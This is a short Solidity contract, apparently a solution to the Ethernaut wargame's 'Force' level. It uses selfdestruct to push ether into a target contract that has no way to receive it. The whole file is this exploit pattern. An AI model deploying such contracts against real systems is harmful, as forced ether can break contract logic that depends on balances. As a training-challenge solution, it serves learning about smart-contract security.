// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.3;

// Donnie Misino, 2022
// Ethernaught 07: Force
// https://ethernaut.openzeppelin.com/level/0x22699e6AdD7159C3C385bf4d7e1C647ddB3a99ea

contract Force_Hack {
    address forceInstance;

    constructor(address _forceInstance) payable {
        forceInstance = _forceInstance;
    }

    function die() public {
        selfdestruct(payable(forceInstance));
    }

    receive() external payable {}
}